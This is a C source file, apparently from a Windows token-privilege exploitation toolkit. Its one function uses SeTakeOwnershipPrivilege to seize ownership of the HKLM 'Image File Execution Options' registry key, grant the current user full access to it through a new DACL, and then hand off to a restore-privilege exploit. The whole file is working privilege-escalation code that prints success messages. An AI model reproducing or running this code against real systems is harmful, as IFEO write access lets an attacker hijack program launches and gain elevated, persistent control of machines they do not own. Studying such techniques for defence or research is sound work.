#include "poptoke.h"

void
se_take_ownership_priv(HANDLE current_token)
{
	PTOKEN_USER user;
	DWORD dwRes;
	EXPLICIT_ACCESS ea[1];
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	user = (PTOKEN_USER)GetInfoFromToken(current_token, TokenUser);

	// build DACL
	ea[0].grfAccessPermissions = KEY_ALL_ACCESS;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_USER;
	ea[0].Trustee.ptstrName = (LPTSTR)user->User.Sid;

	if (ERROR_SUCCESS != SetEntriesInAcl(1,
		ea,
		NULL,
		&pACL))
	{
		printf("Failed SetEntriesInAcl\n");
		return;
	}

	// take ownership
	dwRes = SetNamedSecurityInfo(
		_TEXT("MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
		SE_REGISTRY_KEY,
		OWNER_SECURITY_INFORMATION,
		user->User.Sid,
		NULL,
		NULL,
		NULL);

	if (dwRes != ERROR_SUCCESS)
		printf("[-] Failed to set owner: %d\n", dwRes);
	else
		printf("[!] Success!\n");

	// now that we own it, set DACL so we can write
	dwRes = SetNamedSecurityInfo(
		_TEXT("MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"),
		SE_REGISTRY_KEY,              // type of object
		DACL_SECURITY_INFORMATION,   // change only the object's DACL
		NULL, NULL,                  // do not change owner or group
		pACL,                        // DACL specified
		NULL);                       // do not change SACL

	// exploit it via restore
	se_restore_priv_reg();
}
